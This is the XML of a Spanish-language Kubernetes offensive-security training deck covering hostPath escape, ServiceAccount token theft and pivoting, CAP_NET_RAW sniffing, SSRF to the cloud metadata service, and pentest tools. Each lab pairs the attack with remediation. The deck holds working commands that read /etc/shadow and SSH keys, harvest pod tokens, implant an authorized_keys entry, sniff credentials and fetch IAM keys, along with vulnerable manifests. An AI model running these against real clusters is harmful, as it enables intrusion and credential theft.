            <a:ext cx="164592" cy="16459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623560" y="1051560"/>
            <a:ext cx="1600200" cy="18288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623560" y="1051560"/>
            <a:ext cx="160020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217920" y="118872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2179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71500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SSH al Host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5715000" y="2057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atacante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conecta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directamente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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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75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root@&lt;node-ip&gt; → acceso completo al nodo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="75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1828800"/>
            <a:ext cx="164592" cy="16459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406640" y="1051560"/>
            <a:ext cx="1600200" cy="18288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406640" y="1051560"/>
            <a:ext cx="1600200" cy="36576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8001000" y="118872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80010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749808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Pivot al Cluster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7498080" y="2057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atacante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utiliza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credenciales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controlar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cluster</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="750" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CBD5E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7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</a:t>
            </a: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--kubeconfig /etc/kubernetes/admin.conf get nodes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3108960"/>
            <a:ext cx="8229600" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1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457200" y="310896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00400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051560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Defensas contra hostPath Abuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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11880"/>
            <a:ext cx="182880" cy="1828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6012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 Security Admission (PSA)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960120" y="3822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enforce: restricted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prohíbe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enforce: baseline lo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advierte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611880"/>
            <a:ext cx="182880" cy="18288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07492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OPA / Kyverno Policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="3822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custom para bloquear rutas peligrosas: /, /etc, /var/run/docker.sock.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="80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97680"/>
            <a:ext cx="182880" cy="18288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60120" y="4251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readOnly: true</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="4507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hostPath es necesario (logs), montarlo SIEMPRE como readOnly: true.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800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297680"/>
            <a:ext cx="182880" cy="18288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5074920" y="4251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Auditoría con kube-bench</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="4507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 1.1.12: verificar que no existan hostPath en Deployments.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Text 4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Abuso de JWT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ServiceAccount Tokens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token JWT es la identidad del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frente al API Server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2412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kumimoji="0" lang="es-E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recibe automáticamente un token firmado por el API Server. Ese token representa su identidad (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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</a:t>
            </a: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). Robarlo es como robar su credencial de acceso.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8B5CF6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3931920" cy="164592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709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🔑 Extraer Token JWT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94360" y="2011680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Ubicación del token en el Pod
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cat /var/run/secrets/kubernetes.io\
  /serviceaccount/token
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Decodificar JWT (base64 del payload)
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echo $TOKEN | cut -d. -f2 | \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base64 -d 2&gt;/dev/null | jq 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54880" y="1691640"/>
            <a:ext cx="3931920" cy="164592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54880" y="169164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92040" y="1709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📋 JWT Payload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92040" y="2011680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Contenido del JWT decodificado:
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8DE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"iss": "kubernetes/serviceaccount",
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"sub": "system:serviceaccount:
         prod:api-sa",
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"exp": 1739380800,
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"aud": ["https://kubernetes.default"]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0080" y="35387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Vectores de Ataque sobre JWT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57200" y="3977640"/>
            <a:ext cx="1920240" cy="9144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57200" y="3977640"/>
            <a:ext cx="192024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6908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04672" y="4050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 directo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4864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 un atacante compromete el </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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r>
              <a:rPr kumimoji="0" lang="es-E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puede leer el token desde el </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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filesystem</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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2560320" y="3977640"/>
            <a:ext cx="1920240" cy="9144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2560320" y="3977640"/>
            <a:ext cx="192024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4069080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907792" y="4050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Proyected vs Legacy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265176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Los tokens antiguos no expiraban. Los tokens modernos tienen tiempo limitado (TTL).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4663440" y="3977640"/>
            <a:ext cx="1920240" cy="9144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4663440" y="3977640"/>
            <a:ext cx="192024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069080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010912" y="4050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en env vars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475488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Copiar el token a variables de entorno lo hace más fácil de robar.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6766560" y="3977640"/>
            <a:ext cx="1920240" cy="9144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6766560" y="3977640"/>
            <a:ext cx="192024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4069080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14032" y="4050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Reutilización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685800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 el token tiene permisos, puede usarse desde fuera del </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="es-E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kumimoji="0" lang="es-E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para acceder al API Server.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Ofensivas Automatizadas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Arsenales de pentesting para Kubernetes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43200" cy="45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8872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161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kube-hunter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5087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de vulnerabilidades K8s. Ejecuta desde dentro o fuera del cluster. Detecta tokens expuestos, API servers abiertos, dashboards sin auth.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65760" y="2560320"/>
            <a:ext cx="2560320" cy="20574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65176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Desde dentro del cluster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kube-hunter --pod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Remoto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kube-hunter --remote &lt;ip&gt;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Reporte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kube-hunter --report json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200400" y="1051560"/>
            <a:ext cx="2743200" cy="37490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00400" y="1051560"/>
            <a:ext cx="2743200" cy="45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18872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1161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peirates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15087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Post-explotación K8s. Enumeración automática de SA tokens, secrets, cloud metadata. Movimiento lateral, pivoting y escalada de privilegios.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291840" y="2560320"/>
            <a:ext cx="2560320" cy="20574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383280" y="265176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Lanzar en Pod comprometido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./peirates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Opciones automáticas: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Get SA token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List secrets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Mount cloud metadata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Create priv pod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126480" y="1051560"/>
            <a:ext cx="2743200" cy="37490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126480" y="1051560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83680" y="1161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kubeletctl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63640" y="15087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directa con la Kubelet API (puerto 10250). Ejecutar comandos en contenedores sin pasar por el API Server.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6217920" y="2560320"/>
            <a:ext cx="2560320" cy="20574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309360" y="265176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Escanear kubelets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kubeletctl scan --cidr 10.0.0.0/24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Ejecutar comando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kubeletctl exec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/bin/sh -c 'id' \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&lt;pod&gt; -c &lt;container&gt;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Laboratorios Prácticos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escenarios de ataque real con explotación y remediación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1344168"/>
            <a:ext cx="786384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40080" y="1344168"/>
            <a:ext cx="54864" cy="77724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914400" y="1481328"/>
            <a:ext cx="502920" cy="5029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1440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087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1488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SSRF &amp; Cloud Metadata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148840" y="170992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Explotación de SSRF para acceder al IMDS (169.254.169.254), robo de credenciales de nodo cloud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40080" y="2304288"/>
            <a:ext cx="786384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40080" y="2304288"/>
            <a:ext cx="54864" cy="7772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14400" y="2441448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91440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46888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14884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hostPath Abuse — Escape al Host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2148840" y="267004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de filesystem del host, lectura de secretos del nodo, escritura de SSH keys para acceso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046720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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3200000"/>
            <a:ext cx="5029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F39C12"/>
                </a:solidFill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3200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Abuso de CAP_NET_RAW — Sniffing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35000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BD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pod con CAP_NET_RAW captura tráfico HTTP entre microservicios, interceptando credenciales y tokens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3900000"/>
            <a:ext cx="5029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E74C3C"/>
                </a:solidFill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3900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JWT Token Theft &amp; Pivoting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42000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BD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Robo de JWT de ServiceAccount para pivotar entre namespaces y acceder a Secrets de producción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1: SSRF &amp; Acceso a Cloud Metadata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App vulnerable a SSRF que accede al IMDS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01168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24487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41341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Deployment Vulnerable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307951"/>
            <a:ext cx="3657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 App vulnerable a SSRF
</a:t>
            </a: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
kind: Deployment
metadata:
  name: ssrf-app
  namespace: lab2-ssrf
spec:
  template:
    spec:
      containers:
        - name: webapp                 # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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contenedor</a:t>
            </a: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vulnerable
          image: python:3.11-slim      # imagen con app python vulnerable
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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App que hace fetch de URLs
          # sin validación de input
          # ⚠ Sin NetworkPolicy egress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201168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Explotación SSRF → IMDS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657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 ATAQUE: Explotar SSRF
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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SSRF al IMDS de AWS
</a:t>
            </a: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'http://ssrf-app/fetch?url=\
  http://169.254.169.254/latest/\
  meta-data/iam/security-credentials/'
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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Obtener credenciales del role
</a:t>
            </a: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'http://ssrf-app/fetch?url=\
  http://169.254.169.254/.../node-role'
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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AccessKeyId, SecretAccessKey, Token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1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A1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54864" cy="1737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3756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Remediación SSRF &amp; Metadata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3657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NetworkPolicy Egress: bloquear tráfico a 169.254.169.254</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="135000"/>
              </a:lnSpc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IMDSv2 en AWS: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token de session para acceder al IMDS (bloquea SSRF simple)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="135000"/>
              </a:lnSpc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Workload Identity (GKE/EKS):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usar las del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35000"/>
              </a:lnSpc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Validación de URLs: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confiables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Ips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internas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WAF rules: detectar patrones de SSRF en URLs de input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2: hostPath Abuse — Escape al Host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Pod con hostPath que monta el filesystem del nodo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505456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Pod con hostPath: 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36576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 VULNERABLE: hostPath monta /
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="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
kind: Pod
metadata:
  name: hostpath-pod
  namespace: lab3-hostpath
spec:
  containers:
    - name: attacker                  # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6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Contenedor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="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60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atacante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="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  image: ubuntu:22.04             # Imagen base
      command: ["sleep", "infinity"]
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6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volumeMounts:
        - name: host-fs
          mountPath: /host            # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="600" dirty="0" err="1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Montaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6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host
  volumes:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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host-fs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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hostPath:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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path: /              # ⚠ Monta ROOT Host!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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type: Directory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754879" y="1051560"/>
            <a:ext cx="4010297" cy="2505456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Cadena de Explotación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6576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 ATAQUE: Explotar hostPath
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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Leer credenciales del host
</a:t>
            </a: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/host/etc/shadow
cat /host/root/.ssh/id_rsa
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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Leer kubeconfig del nodo
</a:t>
            </a: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/host/etc/kubernetes/admin.conf
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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Tokens de OTROS Pods
</a:t>
            </a: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/host/var/lib/kubelet/pods \
  -name token -exec cat {} \;
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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Inyectar SSH key para acceso
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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'ssh-rsa AAAA...' &gt;&gt; \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/host/root/.ssh/authorized_keys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84632" y="3657600"/>
            <a:ext cx="8229600" cy="146304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4864" cy="14630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22192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37993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Impacto: Control Total del Nodo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4014216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hostPath: / el atacante puede: leer TODOS los secretos del nodo, inyectar backdoors persistentes, acceder a tokens de otros Pods, escribir crontabs maliciosos, instalar SSH keys, y pivotar a otros nodos usando kubeconfig del host. Es equivalente a un root shell en el nodo.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3: Abuso de CAP_NET_RAW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Pod con capabilities para sniffear tráfico HTTP entre microservicios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51559"/>
            <a:ext cx="3931920" cy="2627267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Pod con Capabilities Peligrosas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36576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⚠ Pod con CAP_NET_RAW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
kind: Pod
metadata:
  name: sniffer-pod
  namespace: lab1-caps
spec:
  containers:
    - name: sniffer
      image: nicolaka/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netshoot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        # ⚠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Contenedor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 con tools de red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
      command: ["sleep","infinity"]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securityContext:
        capabilities:
          add: ["NET_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RAW","NET_ADMIN"] # ⚠ Capabilities de red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elevadas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
      # ⚠ Puede: tcpdump, arpspoof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⚠ Sin NetworkPolicy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3794760" cy="260604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9204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 Cadena de Ataque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65760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⚠ ATAQUE: Sniffing de tráfico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1. Capturar TODO el tráfico HTTP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eth0 -A port 80 2&gt;/dev/null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2. Filtrar credenciales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eth0 -A | grep -iE \
  'password|token|auth|cookie|bearer'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3. Capturar requests a la API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eth0 -A port 8080 | \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grep -A5 'POST /api/login'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2831" y="3771900"/>
            <a:ext cx="8106809" cy="1371600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1975" y="3771900"/>
            <a:ext cx="54864" cy="13716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06" y="3905794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27324" y="39547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Impacto: Todo el tráfico HTTP del namespace es visible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72737" y="4136027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 CAP_NET_RAW, el atacante puede capturar credenciales de login, tokens Bearer, API keys, cookies de sesión, datos de usuario (PII), queries a bases de datos, y cualquier otro dato transmitido en HTTP plano entre microservicios. También puede hacer ARP spoofing para redirigir tráfico de Pods vecinos.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4: JWT Token Theft &amp; Pivoting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Robar el token JWT de un Pod y pivotar a otro namespace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199" y="1051559"/>
            <a:ext cx="3977641" cy="2521131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SA con Permisos Cross-Namespace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⚠ Pod con SA que tiene permisos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otro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namespace
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: v1
kind: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ServiceAccount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             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#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Cuenta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servicio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            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
metadata:
  name: cross-ns-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# SA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reutilizable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
  namespace: lab2-jwt            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# Namespace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origen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
---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: rbac.authorization.k8s.io/v1
kind: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ClusterRole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
metadata:
  name: secret-reader            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# Rol leer secrets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
rules:
  -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apiGroups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: [""]   
    resources: ["secrets"]      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#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Recurso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onsolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> sensible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verbs: ["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get","list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"]  # ⚠ Todos NS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79" y="1051560"/>
            <a:ext cx="3977641" cy="252113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92040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 Token Pivoting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657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⚠ ATAQUE: Robar y reutilizar token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1. Extraer token JWT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TOKEN=$(cat /var/run/secrets/\
  kubernetes.io/serviceaccount/token)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2.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Decodificar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payload JWT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echo $TOKEN | cut -d. -f2 | base64 -d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3.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Enumerar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permisos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RBAC	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--token=$TOKEN auth can-i --list
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4. PIVOTAR: leer secrets de prod!
</a:t>
            </a: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E74C3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--token=$TOKEN get secrets -n prod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4226" y="3818599"/>
            <a:ext cx="8207394" cy="1278201"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0A0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4226" y="3847011"/>
            <a:ext cx="45719" cy="129648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29" y="3847011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68987" y="38777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Remediación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46473" y="4073652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 automountServiceAccountToken: false — no montar token si no es necesario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 Roles (no ClusterRoles) — permisos por namespace, nunca cross-namespace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 Projected tokens con TTL corto — expirationSeconds: 3600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 RBAC Audit — revisar periódicamente qué SA tienen permisos en qué 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 Token Review API — monitorear uso de tokens y detectar reutilización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 Laboratorios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→ Vector de Ataque → Mitigación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536043"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="1051560"/>
          <a:ext cx="8229600" cy="13258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Lab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Vulnerabilidad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Vector de Ataque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Mitigación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26C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con SSRF + sin bloqueo a metadata endpoint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SSRF → 169.254.169.254 → robar credenciales IAM del nodo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NetworkPolicy block IMDS + IMDSv2 + Workload Identity + URL validation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con hostPath: / montando root del host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/etc/shadow, tokens, kubeconfig → SSH key → root en host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PSA restricted + Kyverno deny hostPath + distroless + non-root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690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4023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lab incluye: vulnerable YAML + guía de explotación + YAML seguro + script automatizado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05840" y="43708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disponibles en: Unidad-5/lab{1,2,3,4}/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lecciones de seguridad ofensiva en Kubernetes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023360" cy="105156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45720" cy="10515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1430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1247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metadata endpoint es crítico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349240" y="13990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169.254.169.254 puede entregar credenciales cloud completas. Bloquear con NetworkPolicy y usar Workload Identity.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" y="2286000"/>
            <a:ext cx="45720" cy="10515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774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359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hostPath = acceso al host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051560" y="26334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el filesystem del nodo es equivalente a dar root en la máquina. PSA restricted lo bloquea automáticamente.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57200" y="3520440"/>
            <a:ext cx="4023360" cy="105156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7200" y="3520440"/>
            <a:ext cx="45720" cy="10515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1188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3593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Automatizar la seguridad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051560" y="38679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kube-hunter, kubeaudit, Trivy y kube-bench en CI/CD para detectar problemas antes de producción.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4754880" y="3520440"/>
            <a:ext cx="4023360" cy="105156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4754880" y="3520440"/>
            <a:ext cx="4572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11880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49240" y="3593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Defensa en profundidad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349240" y="38679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control individual es suficiente. Combinar RBAC + PSA + NetworkPolicy + runtime detection + auditoría.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9144000" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1212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Like an Attacker,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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Defend Like a Pro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5 — Completada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&amp; Metadata  •  hostPath Abuse  •  Herramientas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"Conoce los ataques para construir mejores defensas"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22F2BB7616E044ABA9BE1E48A11CC07" ma:contentTypeVersion="18" ma:contentTypeDescription="Crear nuevo documento." ma:contentTypeScope="" ma:versionID="0468aea2944530edfd1b11c0ec301cd9">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns1="http://schemas.microsoft.com/sharepoint/v3" xmlns:ns2="67bbcf3e-0180-4939-ab4a-23606c573aa1" xmlns:ns3="94836490-123c-4276-a909-827cb70af95e" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="cca4cd52219b03770a112f8cb9963f0d" ns1:_="" ns2:_="" ns3:_="">
    <xsd:import namespace="http://schemas.microsoft.com/sharepoint/v3"/>
    <xsd:import namespace="67bbcf3e-0180-4939-ab4a-23606c573aa1"/>
    <xsd:import namespace="94836490-123c-4276-a909-827cb70af9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bbcf3e-0180-4939-ab4a-23606c573a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3a41489-9efd-4705-82fc-442e31f9b6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836490-123c-4276-a909-827cb70af95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a232ccf-6a7f-424e-b818-7b30590d5dfa}" ma:internalName="TaxCatchAll" ma:showField="CatchAllData" ma:web="94836490-123c-4276-a909-827cb70af9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4836490-123c-4276-a909-827cb70af95e" xsi:nil="true"/>
    <_ip_UnifiedCompliancePolicyUIAction xmlns="http://schemas.microsoft.com/sharepoint/v3" xsi:nil="true"/>
    <lcf76f155ced4ddcb4097134ff3c332f xmlns="67bbcf3e-0180-4939-ab4a-23606c573aa1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0159C84-1723-41DA-8B04-3DE9F75D97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6E58BF-82DB-474B-A069-8CBDD29EDD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7bbcf3e-0180-4939-ab4a-23606c573aa1"/>
    <ds:schemaRef ds:uri="94836490-123c-4276-a909-827cb70af9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C3B6BDB-5C58-4F13-B91E-2DE07DB78382}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="94836490-123c-4276-a909-827cb70af95e"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3"/>
    <ds:schemaRef ds:uri="67bbcf3e-0180-4939-ab4a-23606c573aa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2030</TotalTime>
  <Words>3819</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Presentación en pantalla (16:9)</PresentationFormat>
  <Paragraphs>372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5 - Enumeración y Técnicas de Ataque</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Seguridad Kubernetes</dc:creator>
  <cp:lastModifiedBy>Lucas Zuluaga Perez</cp:lastModifiedBy>
  <cp:revision>26</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-02-11T13:24:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-10T20:05:56Z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0x010100822F2BB7616E044ABA9BE1E48A11CC07</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Enabled">
    <vt:lpwstr>true</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_SetDate">
    <vt:lpwstr>2026-02-13T13:08:45Z</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Method">
    <vt:lpwstr>Standard</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Name">
    <vt:lpwstr>71bdff26-5887-4e5c-8426-6e404c233df0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="7" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_SiteId">
    <vt:lpwstr>b5e244bd-c492-495b-8b10-61bfd453e423</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="8" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_ActionId">
    <vt:lpwstr>71fb9359-20e5-4299-a90a-f7183072d583</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="9" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_ContentBits">
    <vt:lpwstr>0</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="10" name="MSIP_Label_71bdff26-5887-4e5c-8426-6e404c233df0_Tag">
    <vt:lpwstr>10, 3, 0, 2</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="11" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>